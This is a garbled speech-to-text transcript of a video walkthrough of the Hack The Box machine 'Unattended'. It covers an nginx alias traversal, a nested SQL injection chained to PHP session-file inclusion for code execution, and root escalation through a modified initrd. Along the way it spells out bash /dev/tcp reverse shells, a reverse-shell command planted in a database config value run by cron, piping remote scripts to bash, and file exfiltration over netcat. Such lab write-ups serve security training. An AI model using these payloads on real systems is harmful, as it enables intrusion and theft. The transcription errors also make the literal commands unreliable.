 what's going on YouTube the zipsak can be doing unattended from hack the box which I believe the name comes from the final step which is routing the box the disc itself is encrypted so normally with encrypted disk when you boot up you have to mainly enter the password the Creator did a hack with an init or d2 input to pass one of the machines unattended allowing the machine to boot up with an encrypted drive anyways I really like this box because it benefits those that a multi-discipline meaning that they learn how to build things as well as break them the foothold on this box is really tough it's a nested SQL injection very similar to it second order SQL injection where you have one sequel query that has user input you make that sequel queries output a sequel injection so when another sequel query uses the output it gets injected as well and all that is done blindly which makes it really tough unless you take advantage of a source code disclosure and then build the application on your own because if you control the application you can enable debug mode and step through exactly what's going on and it becomes very apparent so with that being said let's jump into the box as always we'll begin with an maps or - SC for default scripts as V enumerate versions Oh a output all formats plan the EM map directory and call it unattended and then the IP address which is 10 10 10 126 can take some time to run so I've already ran it looking at the results we have just two ports open we have HTTP on port 80 and HTTP on port 443 booth ports are running nginx version one point ten point three but of course the HTTP one does have a certificate which is leaking the hostname which is dub-dub-dub nested Flandres htb so before I forget I'm just gonna add that into my hosts file because you never know if that's gonna be needed so 10 10 10 126 and then we'll also put it without the www so that's that and then the last thing sometimes it's beneficial sometimes it's not but we do see that certificate was generated on December 19th 2018 and if this is a self-signed suit we know someone was on the Box then if this was like cert from let's encrypt you don't know that because there's a gently automated because of how short the lifespan of their certificates are based upon this being three years I'm guessing someone manually generate the certificate so let's go check the page out so 10 10 10 126 is just a blank page let's go to HTTPS we see we have to accept this certificate warning and then we can also view the certificate to see if we have any like email addresses or anything so let's just go to details go down we get all the information issuer nothing there and nope nothing so let's just confirm the security exception and we get a blank page we can try the hostname WWN s did Flanders HT be and it's like force except the certificate warning again and we get the Apache to default Debian page so we know the OS is now Debian but we don't really have anything so let's throw this into go Buster so let's go to terminal and then we'll do go Buster - h2 see the syntax and you'll see that I found the upgrade to go Buster 3 which changed up a little bit than my previous videos we see right off the bat we have four available commands one being help so that's not really anything so there's directory mode DNS mode and virtual host mode we want to do the directory brute force so we do go Buster dir - H and you see it's the same taxable familiar with afterwards so we'll do - you HTTP dub dub dub nested Flandres htb and then - w for word list user share SEK list and we can do discovery web content and we'll try comment text so running this oh we also need the - K flag to ignore SSL Certificates and we can see HD ahea access and HT passwd came back but it's gonna take a while so I'm gonna try upping the threads so we'll do - T a hundred to go from 10 threads to threads and we see how quick this is but it's no longer really finding things it missed a lot because we don't have that h ta h ta access it only found /dev so hundred threads maybe too much I'm gonna try 20 threads and there we go the great thing about this version of go Buster I believe is you can do white listing status codes instead of or you can blacklist status code instead of only doing a white list so they have better logic and a lot of things it did find a /dev so I'm going to copy this syntax open a new window and add /dev and up there it said dev had sent a 301 redirect so let's go see what slash dev is so if we do slash dev it redirects us to dev slash so we could examine that and burp suite by turning burp suite on go to slash send this request of course we have to accept this certificate go to burp suite and then if we do get on slash dev we can see we have crashed the web service cos will gang of five or three so a go Buster's may actually be too much for the box so let's put this to ten threads get rid of this one on dev and do these slowly because we have definitely crashed the box doing that so now when we send this we get that 301 moved permanently and the location just adds that trailing slash so nothing too interesting there to an intercept off go back and I guess that's all we can do right now with that so we're stuck waiting for this go Buster command to fin or give us new places to look at so I'm just gonna let this one run and here we have it also finding a index.php index.html exists but so does PHP so let's go check out index.php and we see a page of nested Flanders portfolio and it's telling us they had to restore the website to an old 2001 layout but just drop them a mail with a contact request so if we go to contact we will see thanks so much for getting in touch with us unfortunately the website is under a heavy attack so they disabled almost every dynamic page come back later so we can also take a look at about we see a company is leading export at nesting stuff and they also have this ste and emphasis without that it's just Ned Flanders who this is a picture of so he's from The Simpsons if you haven't watched that I'm sure everyone's seen it but anyways we just have three pages the main page with Ned Flanders on it the about page with this and the contact page with this so naturally the very first thing I want to do is play with this ID field so if I put random junk in the ID we're going to get Maine so that is a little bit interesting if we put 465 in the ID field whoops we get the about page so if we put a single quote in it we go back to Maine so we just aired out the field we can put - - space - which is a comment in sequel and we go back to the intended page which Isabel we can also do a pound which I believe is also a comment maybe it's not pound space oh we probably have to you okay that because that's like an anchor tag in HTML so let's just go and send this over into burn so send to repeater could go if we do ctrl shift you here we can see that's just your own coded we can do control you to your own code that pound and we see the bell page which is 465 before we send all this let's just put this in the clipboard is a hundred and one thousand five hundred and forty seven bytes if we do the main page which is 25 I believe main 25 that is 64 bytes so as long as we're not at 64 bytes we're good so let's go back paste the single quote and then pound signed and 147 bytes so this still works I normally just don't use the pound because if you put it in your elbow then your web browser is just going to ignore it because it's meant for anchors so we definitely have a SQL injection here we can play with this a little bit further by doing like whoops on Union to see if we get anything so we can do Union one and send this all and as long as we don't get the 1500 64 bytes we should be good so Union one we got 64 bytes but we also forgot to put the comment at the end still 64 bytes so we can do 1 comma 264 let's see I thought that Union would have worked we can put a single quote here and then the server will put the trailing single quote 164 so it looks like a union is still failing so we can do two three send it 64 so Union just isn't working we can try putting contact and see what happens click send 64 so nothing seems to be working with us here so while we fooled this we probably should of sent this over to SQL map so let's copy the request and then do I got rid of something we got Oh server status there but let's do SQL map before we do that let's make a directory request and then we can just right click copy to file requests and this will be ID rec go in there SQL map - or that file - PID and we'll do - - match so it doesn't ask us for anything so while that runs let's go back to burp and play with this field the first thing I want to do is revisit this Union thing so if we do Union select one put this all in uooo encoding we get oh we need the comment click send 1200 9 bytes so I think I forgot this select last time so I think I just did Union 1 because I was talking and just forgot to type something so we get 1200 9 bytes 1 to 1 if we do - let me get 1564 so we air it out we know we want 1 we can render the page and see what this looks like and we just don't get anything so if we wanted to we could try saying hey this select statement returned contact which is a strain on the page and if we go back to raw 1428 bytes if we do about we get 1557 and if we do main we get something different so we know we have a Union injection here but unfortunately we can't really control what's on the output of the page because we can only select certain things if we have an error message it just goes to the main page and we're not getting any of the output that we Union out so what kind of stuck here the one thing that we haven't really explored is /dev and this is nginx why is this asking for assert again let's go back to burp suite I'll just turn it intercept off I've got to add rip to my ca let me do that real quick let's go HTTP colon slash slash burp CA certificate save I rebuilt my Kali BM so that's what I'm having to do all this stuff certificates authorities import CA cert identify websites ok that should make things a bit better so what was i we want to go to dev so we know this is a nginx thing and nginx has a Miss configuration I think it's in the latest I'm not positive about that but if you search launch sigh path traversal and it is breaking parser logic there's also a video of this somewhere breaking parser logic well this one right here it's a good watch it has stuff about this exploit and in order to demonstrate let us just Google let's do django nginx config and we will just go to a read the docs and grab a nginx config that's used in Django doing is just a common thing I've seen this in and before we do that we have this SQL map did find it so let's do - - match - - DB s to enumerate what database is on the server and then let's go VI I'll just call this notes and we'll paste this config see if we move notes to notes dot dot config for nginx well vim highlight yes it will so this is just a standard nginx config and you got the server what board it's listening on and stuff so most web servers you don't ever want to execute things out of places using may upload which is like media static downloads etc you just wanted that to be file storage so we see and nginx location slash static slash and it's aliased to this directory and this directory will never execute codes if you upload a PHP Python whatever file is just gonna serve that file on location slash this is what's doing a proxy pass and setting it to something to execute code so the misc configuration is if you don't have a trailing slash here then what's going to happen is the location is slash static so you send a get request to slash static and you hit this code block and then you put two periods well you hit this code block which is alias to this directory with a trailing slash and then put your two dots there and then if you do slash you have now essentially escaped out of this and you and access files that's not in static so hopefully that makes sense so that's what we're going to try to do here so let's go back to purp we can go to repeater and we're gonna get slash dev slash and we see 200 ok if this directory doesn't exist weak of course get a 404 we do dev dot dot we get a 403 forbidden so I'm thinking that we have like a alias location slash dev and that's alias 2 for dub dub dub and instead of HTML it would probably be alias to dev and that's it and then location slash alias slash / dub dub dub HTML and this will be execute code so the nginx config probably looks something like this so when we did this dot dot slash we are now in dub dub and if we go to HTML we'll see what happens so dev HTML click go move permanently it puts a trailing slash on for us so put that trailing slash and now we're there so we can try index.php and now we have the source code so let's copy this entire thing go into terminal we can make the nginx download source and then VAM index.php paste it and then start looking at this code so so named localhost user named Ned Flanders we got a password so if we copy this WC echoed and paste WC - c-38 it's not a known hash link so I'm guessing this isn't a hash and then I also see some weird hex like 10 which I know wouldn't be like valid ASCII so I'm guessing this isn't anything because if we do man ASCII table man maybe just ascii hex 10 which is this so that's what I'm not thinking it's X and maybe that's just a password so let's keep going down we got the database which is Neddie we get this debug flag which is false we got a second file with a long name so let's just copy this go back into burp and see if we can download that file send looks like we can so we'll copy this go into the same directory and then I should copy this VI that copy paste ok so keep going down we have SQL statements so let's see this is the SQL which we are doing so selects name from ID where I'd equals 25 so this is it failing though is the syntax SQL is equal to name from ID equals this if it fails it doesn't exist go to 25 which is main so this is why we kept seeing the main page when we failed and then we're taking the result and then returning this so let's see how this code works because these are functions so we have to get into main to see what happens so let's see TPL so this is the main of the program it's gonna run it's gonna create this TPL variable and it's gonna get TPL from ID what i'm guessing this means template and then that template is going to return like main or something it's gonna return whatever the name is an ID name so maybe help if we did SQL stuff so we want to do dash capital D Nettie and dash dash tables so if we had a visualization of the database this may make more sense but anyways the name this is going to be a PHP file and that's going to pass that into get path from this and then at the what it does with this is creates that include variable and include is going to execute code so a little bit hard to understand so let's just create our own server and enable this debug flag and step through the code and there's a word Dockers gonna come in super handy no sometimes it's so hard to exit them but anyways where's index dot PHP oh I didn't save it true I forgot I open the following vim and pasted instead of saving it somehow so we can just copy this look at this and it's still going so slow - - tables and we want threads ten okay we could probably make this not blind because we know the error code is getting to the main so let's see if we can fix this row kayaks whoops sorry about that I hit the mic but let's see if we go to main turn intercept off is off let's see we say the error is equal to ridiculous wonder what's gonna happen so let's go back and let's go map - each graph - I here SQL map - H less yeah here oh let's see can't remember the syntax let's just try it so let's try - - string or not - drain and we said ridiculous so see if this beads up SQL map because we don't want to do blind let's see if we get rid of all these settings I'll see yes follow still doing blind hem dot SQL map - RF and try this we want to do - - patch and quit V ID dot request 465 that's fine I just want to make sure we weren't sending it to page 25 which would always have that even if it has a success so hopefully this will tell us something other than blind but while that runs we can go ahead and start creating my docker so we would need to install docker first so apt install Dakka Dakka - compose yep and while that downloads I'm going to go to Google and we're doing la MP docker github lamp stands for I figured what l stands for but Apache MySQL and PHP so let's just go to this github page and you could go to like docker hub and just pull one but I like doing it this way better so we'll get clone on this project and then the docker file this is gonna just say what things to install a pull from docker hub and then this compose file is actually going to be the configuration so this is giving us three different containers we got dub dub dub the DB and PHP myadmin I don't want PHP myadmin so I'm just going to delete that container so we now we just got to so dub dub dub it's going to redirect port 8000 one on our local machine and send it to port 80 of this doctor that is fine it's gonna take our current working directory slash dub dub dub and mount that to verb dub dubby HTML it's got to link us to the DB container and gonna give us the default Network database is going to install my sequel version 8.0 it's going to map port 3306 on a local host to 3306 of the docker container and then configure MySQL with my DB as the database user test test and here are the volumes and that's it so the darker entry point is going to be dot slash dump and there is a dump here and that's going to be the database so we want to change the database there are two tables we want if we go into nginx downloads then index dot PHP well we can buy just grep select out of this we will know we want the table ID name and we also want a table file path so we need two tables and then we need under ID name we need ID and meeting name so let's go create that so the first one will be ID name and we already got ID and name here so that should be fine we need a second table so we'll just paste this that table was file path we go over here file path we need name and path so let's do we can just complete ID put path here and that should be fine next thing we have to do is insert data into this so we can insert into ID name and it was if we go back main is 25 I'm looking at the bottom let's to the screen about is 465 and contact is 587 so we can do 25 for 65 and 587 and all this stuff isn't needed but if you want to be excellent fantastic vulnerability you should know how to stand up services on your own so you can always play with things in your own lab because if you have control of the software you have control over how things output and you can see things that you normally wouldn't be able to so we got that one pulled let's create the second input and this one we don't exactly know that much about other than one is name and one is path and name we know is going to be from this table so they're linked so this will be let's see we can just since we already have main about contact there we can put this to be name and this to be path just changing the order we're putting them in and I'll call this main dot PHP about PHP and contact PHP we know that's not the case on these servers because if we just go to main dot PHP it doesn't exist but that part doesn't really matter the last thing we have to do is dub dub dub this is just the default index of the docker we'll just make this dot php' back and copy the nginx downloaded stuff into this directory and I think we have it so we can just do docker compose is it up - d I think that will go install everything and then while docker installs let's see where's n this boolean base blind so by doing that - - not string we have now SQL map saying bouillon base blind instead of only time-based blind which is great for us so now if we do - - - capital D Neddie - - tables we should see this go a lot faster than before there we go so you can see how much quicker this is before and we can also do - - threads 10 and almost instantly got that one so I'm pretty sure this is doing boolean based right now instead of going to time based it's going pretty quick so yeah that is definitely doing the boolean based output to speed up getting data out of this so we'll just wait for doctor to finish which it already did so they do docker PS shoot it looks like we have an Arab and a dub dub dub director um my sequel because that docking container is not running V dump my DB let's see what could be the air path name main path that's good ID name ID name everything looks good let's see docker images docker is it run my sequel database initialize password nod let's see docker compose up - d/p docker compose i don't know why it's not starting the DB let's just go down with the config maybe I deleted something extra out of this well we can also do darker LS or Tanners LS see says the DB is running dr. PS ok so maybe I just did dr. PS too quickly and the database had not started yet because it's running now I have no idea what happened there but looks good if we do localhost it was 8,000 won we have a bunch of errors like a bunch oh if we go to dub dub dub V index.php let's go here nginx downloaded nope dr. lamp dub dub dub and xp-80 back we can see we air it out because we can never connect to the database and we can't connect to the database because we didn't change user name password and things like that so if we go here we're connecting the hostname is DB the user is user the password is test and the database is my DB so user is going to be user instead of localhost is gonna be DB and it probably would work with local host because we didn't change the port we're listening with remapping local host be three or six to the container 3 3 or 6 so we'll host would probably work there password is test and the DB is my DB okay refresh the page and we don't really get any errors except filename cannot be empty on line 97 and that's probably because we don't have main dot PHP so if we V main dot PHP and we put please support me on patreon refresh main phone aim cannot be empty on line 97 let's look at line 97 then index 9 7 include i and c and i NC should be something let's just turn debug on and see all the debug output this application gives refresh the page so we can see all the things all the commands so it's doing a select name from ID name where ID equals 25 and that's point main so selecting path from file path where name is equal to main and we're not getting anything so maybe there's no main and file path we do my sequel - you user - be test - D my DB to connect to it I think capital D password is test H localhost let's just look at dump CD dum what is this database so let's see so into follow path I wonder if it just dint like a swapping those two and it still has name as main dot PHP so if we do Union select main dot PHP put a comment we still don't get anything so there's definitely something screwed up with that file path table that we have to go examine so let's do let's see my sequel su user capital D my DB - H localhost shouldn't be able to connect to that - P 3:06 localhost it is open let's make sure we did the host flag correctly so man my sequel host - H so my sequel - H localhost - new user - P put the password is test and it can't connect should i connect into the docker so docker container LS docker container inspect we want this IP address is 172 18:02 so let's do 1 72 18 to test and we get in so something's weird with the network mapping but we're in we can do show databases use my DB show tables and the file path table does not exist so I'm not sure why that is let's go to dr. lam dumb cat that and we can try creating this so create table file path well paste line three so we have an error somewhere to the use of path let's see path work here not all the oh we don't have a comma shoot me that will do it every time so if we create this table paste okay and now we can insert stuff into the table okay refresh this page there we go so let's take debug off so you can see what it looks like without the bug so let's just exit that exit this go in dub dub be index dot PHP debug set to false and you can see the page if we put the image there all this will look the same if we click on about everything is erroring out and going to main but if we did something about we created a belt PHB and says please subscribe on youtube and refresh a belt still wearing this is not going as smooth as I thought it would turn debug the trail okay select name from ID name where I'd equals 465 go to main find that 25 everything is returning main weird my sequel use my DB so tables select stir from ID name select star from ID name you don't have anything in ID name so because their script had aired out it just didn't progress so let's go back in a doctor lamp and populate ID name so cat this insert into paste so what happened was weird out right here because we didn't have the comma so it didn't make it into this insert statement so now if we do about we see please subscribe on YouTube if we do main we get patreon if we do contact we get an error message because there's no contact PHP so that is what we finally expected so now we can do what we want to do beginning and analyze the SQL injection because this is a cool one so we click send we have the debug statement here so when I put that single quote in and we hit a error message you see what's happening we that's the single quote we inject it and then depends that so we did the comment and then this one is rejected we can do Union select one and send this in so this statement works we have successfully doing Union injection ret TP l equals one but there's no path from file path where name is equal to 1 so we error out here so we have to do is inject into this injection so what if we put a Union injection in this so if we do a second Union right here so we're going to put a single quote after this one because we want to terminate it I mean terminate this so right now that one single quote is that piece so we can do one single quote Union select EPS AK and then I think that may be fine let's you all encode the spaces see what happens ok so we have successfully put that as the return template but we still aired out here because we didn't kill off this last single quote so if we do think that there we go so this piece what I highlighted gets injected into this second injection and this single quote after this one is needed to place this here if we don't do that you can see exactly what happens it'll error out because we don't have that single quote so that's why I see the double quote on the left side because that is quoting everything to go into the second sequel and then the single quote on the right side that one is to escape this so hopefully that makes sense and then you get the return path of Apes ACK so now we can include any file we want on the server so if we did like index.php we'll see it does stuff so now we wait to find a way to get code execution on the server there's a few things you can do there is like proc self FD and then you can just cycle through numbers and then eventually find the file descriptor for your request that may have code you can in fluence there's also like the nginx log file that you may be able to read but I don't recommend doing that one because if you screw up and put a PHP syntax somewhere then PHP stops processing the file and you have a major issue so if you were depending on that to do the Box someone could just screw you up completely there is a file on this server though that one with a weird hash so let's examine what this is doing so we're getting a session start and then sending every cookie we have into our session and PHP sessions get stored generally on the disk so if we can find out the cookie foe name we may be to inject a malicious cookie and get code execution through that so what I'm going to do is we're going to jump into our docker container and look at the session file so let's do docker container LS so we want to attach to this so docker container attached I shoot I just shot my container down I think docker PS I did docker container start it's back running it's attached to it I wonder if I could specify like - TI or something probably shutting it down let's start it again Tayna attached then bash I think I do - TI here let's see oh sorry about this I don't use docker that much attached kill it let's do start and bash I think I can do TI there nope let's see going over to Google docker a - run - come on load you can turn intercept off probably I think it's intercepting that request yep Oh exec that's it let's start the container docker exact - IT this and run bash there we go let's go to slash find dot - name stir SES and then pipe errors - dev null to find where sessions are there just and /tmp and we can see what a session looks like on disk if we did just cat it cat star c5 this session has data cat this we can see what it looks like so if we go back into a go to repeater that c5 name is used for the file name and then the cookie we are sending there's nothing so because the code is taking all the cookies and committing them into the session so for each cookie commit cookie into session we can write into that file so if we just say we have a cookie called EPS ACK and if SEC is going to do PHP and then system on a get request or not that get like this please sub and then get out of PHP if we send this and now go back into that same exact cookie we can see this cookie file now has our PHP code so if we include this we will get code execution here as long as we have the police sub variable so it's just like any other PHP shell but yeah so let's try this let's do the file /tmp SCSS underscore the PHP session ID and then we also need to create that variable please sub is equal to will do Who am I I guess click go and we see it's giving us our PHP session ID if SEC and then the user dub-dub-dub - data so there we go we have code execution in our doc and container now we have to do that on the actual web server so let's go back here let's see this is on nested Flanders so if we do look if I just copy that whole request so copy this send it here and X dot PHP so here's the command we don't need this for now ID is equal to 587 that's fine Union select temp SCSS we need to change that session ID so copy paste and then click go and we don't get anything so if we try other default PHP locations like for a temp click go still 1200 9 bytes what if we tried ver Lib beats P sessions 1209 bytes oh we never copied the cookie we go so ver Lib PHP sessions we don't have a CSS 1277 bytes so we found the location of PHP and if you just Google like default PHP locations where's PHP sessions file stored it's probably on this page but ver temp temp slash session for a temp slash session valid PHP session there's a few standard locations so we have code execution here and a target still W nested Flanders so now that time comes to get a reverse shell so let's go here and we can do NC L V and P would do port 443 if you enumerate this box more and did like find slash Etsy - grap or does it ipv4 and enumerated this let's see find Etsy we run that let's see Etsy IP tables rules v4 so if we looked at the IP tables rules okay we would see the output only a Wells 80 and 443 so that's why didn't do 9001 because looking at IP tables says we can't do that so for exploit we will do I'll type it in terminal because it's easier to read - see then we'll do bash - I direct and dev TCP 10 10 14 3 which is my cow a box / 4 4 3 and then 0 and 1 like that and then we and that and that is it so let's copy this go up paste go to burp paste that in URL encode it click send and now we're on the box so if we do which Python which Python 3 we don't have any Python the box so we really get a shuttle that way but there is a command called script and we can do script - H we want to do script - quiet command then bash and send the output file to dev Knoll and this is essentially the same thing as the Python import TTY so now if we control Z this and do s TTY raw - echo FG enter we have tab all to include everything so we have our standard shell here so the very first thing I'm going to try to do is cat Etsy oops then type Etsy that's weird Etsy passwd look at various users and we don't see any we could try s you go e actually we did see that one and then grab his password out of the PHP let's see grab this this is my sequel password and try reusing it see is that in my clipboard it is I paste it twice so let's paste it once and we get an authentication failure if on the box you had actually looked at all the tables there's a lot more tables than just ID name and follow path and this is from SQL map so now that we're on it let's go and look into the my sequel database to see what's in the other tables so let's do my sequel - you this is gonna be less index username is nested Flanders - database is Neddie - P and we can do show tables and now we're in the database of from unattended so let's just start looking at the tables so I'll do select star from config and let's see select star from config I don't know why sometimes I say things and forget to type it but anyways let's look at all these options we have off my message sequel host an FTP user flanders and ftp password well we didn't have FTP exposed so we can kind of ignore that but may want to save this and 0e 1a that looks familiar at Kadesh and WC - c 72 oh that's um it looks familiar because there's a weird type confusion vulnerability in PHP if a hash begins with 0e because that's the if you google like PHP equal vs 3 equals you'll come up against it but if you do 2 equals it'll convert this it's a C's 0e and translates what after this to an exponent which 0 to whatever exponent always always going to be 0 so you have a weird collision there but move on that doesn't really look too interesting email we have this check release thing and it looks like it's executing scripts and because the way this is I'm guessing this is just like piping bash and we can see looks like I accidentally updated SMTP secure when I was doing this box originally as you see something there but if we just put that bash command in to check release we'll see what happens so we want to do an update command so we do update and then the table name which is config and then we set and what is that column option value so set option underscore value thing I think it was down to school yep under school value equal to bash see let's do fast - see fast - my dev TCP 10 1014 380 0 & 1 that and shoot where ID is equal to 86 semicolon so now if we select star from config select star from config we see check release has that and we should hurry up and set up a neck at listener on I think we did port 80 there yep so we can do select star from config wear ID is equal to 86 and just look at that and every minute something does execute this if you did like the looking at processes every second you'd eventually see this get executed but just running that listening we do have a show as GUI and we can do Kat check base PL and we can see what those are but if we do WC - see user dot txt we got 33 characters which is an md5 sum in the line break so we are confident we are on gully so let's run the UNIX profess checker so let's go up CD we copied out copy opt linda doom and then Len knew about Sh here and we can do make derp dub dub dub move that in there so we don't share our notes with everyone who hits a web server and then Python em simple HTTP server on port 80 so now we can curl 10 10 14 3 when a new message pipe it over to bash curl not found we can do and see lv n P 80 whatever connects send over Len Danube and we can do cat dev TCP 10 10 14 3 4 80 and pipe that over to bash cat bash - see cat dev TCP 10 10 14 380 pipe bash like that so not a file let's see can I pull it this way ok I can pull it that way so for some reason cat can't access that but if we direct it like this 10 1014 380 pipe to bash there we go now when a new is running a bit of a hack to get that working but oh well at the beginning and let's just look through things so let's see your kernel is from 2017 so maybe the owner that's GCC version I'm at and December December October 27th is when the colonel is so that's only like two months when the box is created and I say two months because that's when the SSL cert was if you remember back from a enumeration the SSL cert was generated I think December 19th so can probably ignore that looking through user groups or a member of Grubb which is unique and if we go down let's see what else we see that's a pass to BD we looked at that environmental nothing interesting cron jobs nothing too interesting systemd timers nothing interesting networking information nope DNS and that stat process that or running so far the only thing that stands out is being a member of the grub group MySQL file locations set you IDs nothing non default configuration files nothing we do have a bash history oh and in order to exit that we just got a killer net cat so cat dot bash underscore history nothing cuz that's piped over to Devon all if you looked at mount and looked at everything you would see something weird we have SD a to crypt so you combine us being a member of the grub group which is unique and then the actual drive saying that it's encrypted you got something interesting going on so maybe we modified Grubb to order map a crypt encrypted drive is what I'm thinking because normally a system won't just automatically boot up if it's encrypted you have to enter a password so the other thing you could have done would be like find / - group grub - look at all the files that grub owns or what's unique to them and I've always pipe error messages - Devon all and we see there is one file an it Rd image so the boot that grub has access to and that is unique additionally you see December 20th 2018 and if you look at the user text December 20th 2018 so user detects was created the same day this init Rd image was so let's download this and see what it is what's changed so we'll do neck at LVN p80 an it Rd image is what we'll call it okay and we can do cat / boot and we can by just paste copy paste - dev TCP 1010 14 3 port 80 looks good we got a connection from looks like it's already copied and we have it here so as always we should md5 sum to make sure it fully copied and d5 some do b88 ends with 92 b88 ends with 90 so looks like we have the file and its entirety so we do a file against it it's gzip encrypted so in order to extract the we should probably make our own directory and we'll move an it up one and then go in that directory so we'll do z cat to do a decompress cat on that Zeke at an it Rd image and then you pipe it to a command called cpio and do some flags - i means extract - d means make directories and then m means preserve modify time and v for verbose so now we're extracting that kernel image and we have to figure out what is unique here so we could look for more things like December 20th so if you do find period - type for file newer modified time of 2018 12:19 this is when the SSL certificate was created and then newer MT 2018 1221 - LS we can see all the files that were created between that time so we can narrow what we're looking for here and then we also wanted something that don't with which we'll call the Crypt SDA - crypt and we got crypt root right here so let's look at what this scripts is and going down you dev parse activate set UID taken from this let's see spy limit syntax howling does help some time and it search for password deal with look password sync one route changes so here we have the Crypt open command to try to decrypt to drive and it's calling s been you and net or a D and then this string so and it should also tell us let's see gulley so it looks like comments prepended with gully of gully writing so if we grep GU ly - our period that's the only comment we grep password we get a lot if you don't want to see that binary file matches - capital I gets rid of that see nothing too interesting so let's go back into the clip droop so we have to deal with what FS password sync when root changes her one so maybe this is hinting at something with the password feel like I missed something on this box let's go back to our shell where is our shell gully let's go to home directory find - LS my comment doesn't really make much sense but the password to decrypt the drive is the same as the root password so if we look at this  set up Joey and we execute this let's see we'll copy this look in the machine we don't have that s pin file if we go into an it see do we have that file in s pin we get super Kaluza so we can try using this as the password show label rule my show was there we go su - must be run from the terminal script - QC been bash / - dev null su - a stupid Kaluza authentication failure so that's not the password let's try this password su - sonication failure so at this point you could run which we'll call it ie toe or Deidre and try to analyze this every time we do something it's giving us super Kaluza so when we just try executing the decrypt command on the box itself so if we do s pin UI net Rd I have that my clipboard we get permission denied mod + X s been you an it Rd copy s pen you Annette Cody okay CP / S Pen you and net OD to my home directory permission denied let's see Mount where can I write - lets do now grab temp I'm just making sure looking for a place to mount right - that has does not have that no exact flag over time also has no exact so let's see ver Lib PHP sessions can right there so we can just do s trace we app install s trace we can see what this binary is doing LS dash L a s been you an it Rd CD / S Pen scrap an it o SLA you and that Rd yeah only root can execute that okay s trace so I spend we can see the file does let's see what's it doing you no such file directory on / boot / gooood and it's also looking at / Etsy slashers name so let's edit the Etsy host name go back here cat Etsy first name we get unattended paste and then we want to cat Etsy boot gooood because that's the other file at red v boot gooood paste do s trace again so it accesses reads unattended gooood fine it writes something so execute this it wrote this so let's see if this will work su - paste authentication failure so let's do md5 sum boot gooood to make sure we copy the files correctly and we can do them on our box md5sum / boot gooood same thing md5 sum / Etsy hostname md5 sum Etsy hostname those are the same let's history grip an it I think I left off something yeah I didn't have the n1 so that's why we got that so this definitely matters it's doing some type of crypto routine let's try this password su - and we have rooted the box so there are two things I want to get into we'll do deidre first and start living it it'll take a while to load and while G Drogo's I want to look at a nginx configuration analyzer so deidre gauge run let's see close file new project on shared route htb boxes unattended project name you and net Rd open this then file import file see HCB boxes unattended an it s been you and there already it's an elf file analyze it let's just select all analyze okay so while that loads let's go and analyze this so one thing you could have done if you couldn't figure out how to get a TTY shell is if you did IP addr on the box to look at IP address you have an ipv6 address and you can also do the link local if you want to know how to do that link local look at my sneaky video but link local would mean you could just and map the ipv6 box without being on the box to identify the link local address but you could SSH let's get a fruit go into our home directory make two SSH CD dot SH and then make their sh-sh - key Jen then copy the ID RSA bub so if we copy this and then put this as the author I authorized keys shoot to authorized keys cat authorized keys looks good chmod 601 chmod 600 SSH - iid RSA go at the ipv6 address because iptables is only configured to filter the ipv4 stuff yes see it doesn't look like the key worked so I IDRs a let's see search mode 600 got a seiche pub LSH authorised underscore keys let's try to transmit via netcat 700 the directive permission on that nope so let's try and see a cat dev tcp 10 1014 382 authorized keys wonderful eyes keys is disabled something weird that's stopping that oh shoot I have two L's there there we go oh I know I wasn't going insane but then you have a standard SSH and you can just ask you that way so the final thing we want to do is look at nginx so let's just see so screwed tor c JV f @ c nginx or call this engine expert bz2 okay make der nginx and c lv n p8 e and an XOR B Z 2 and we'll copy this file here ok tor z XB f ZX there we go so now we have the nginx configuration so we can go to Google and look at I think it's GI X Y it is C opt get clone CD get C and actually I think it was a pip install yeah we can do kick C - H and then wants us to send it the nginx configuration file so this will be unattended nginx at sea nginx and next comp no issues oh I should have tested this before doing it alias oh it's because the virtual host configs is a wrong path so let's see oh it's away at sea grab nginx I do have something in Etsy so let's move nginx to nginx old and then we can do move htb boxes unattended nginx let's see here okay kick C at C nginx EDX Kampf and we have one hi finding of the issue you can see location slash dev doesn't have the trailing slash and the alias so exactly what we thought and again the reason why it didn't work before was Casey was analyzing this it saw this include statement and went to slash Etsy nginx conf dot d which was my nginx configuration not and unattended which didn't have an issue so let's clean up remove nginx move nginx told to nginx something like that we're probably better and darker and that's probably why dick Dixie supports docker so you don't have to worry about those issues um let's see Skeeter no longer running I was doing that entire thing while gage diluted and I guess it crashed I don't know what happened let's try analyzing this again analyze it and stead of selecting everything let's just click analyze and I'm gonna wait until this loading bar stops so the binary is finally finished processing I'm going to go to my window and then define strings and I'm going to look for [Music] was it super Palooza or something super Kazuma and find where this is I'm going to right-click on the address references show references to this address go here and then we can look around this section if you look at the decompiled you can see it's doing a call on getting hearst name and then it also does something on boot gooood if you change the view where's window maybe a window function graph could be easier to read oh no the Hearst name is here I don't use this that often it's hoping it would highlight this there we go so does that makes a call goes down and then we have but-- do it here goes and if there's fail goes down here which then just sends the super kizu wa so we wanted to get into this code so that's why I changed boot gooood and Etsy host name it does some magic stuff and then does probably some crypto algorithm here to create some type of sum which is the roots password if we echo - n WC - see we see 40 characters so that's probably creating some cool string and then doing a sha-1 some against it so I don't know what that sha-1 some is maybe it's a combination of Etsy host name and boot gooood so if we echo - n unattended the boot gooood sha-1 sum we don't get it so it's doing something with that I didn't look enough but that's essentially the box if we want we can clean up our stuff so Etsy host name to be back to HDB we can remove ooh gooood and then I just thought of how to do this so if we went back to the gully user we can create here because we created the SSH key so if we copy spen you and knit here we can however we had it on our box so if we go root H to be boxes unattended an it s been NC L V and P 80 you an it Rd and then cat dev TCP 10 1014 382 you an it Rd we can transfer the file and I don't think it will kill my neck out automatically so we now we can do chmod plus x you a net dot slash there we go so now we just have to get that one string grip CD emit grab - our eye password it's in this crypto root you an it Rd this string and there we go we got the password I forgot that string here oh well that is the box hope you guys enjoyed take care and I will see you all next week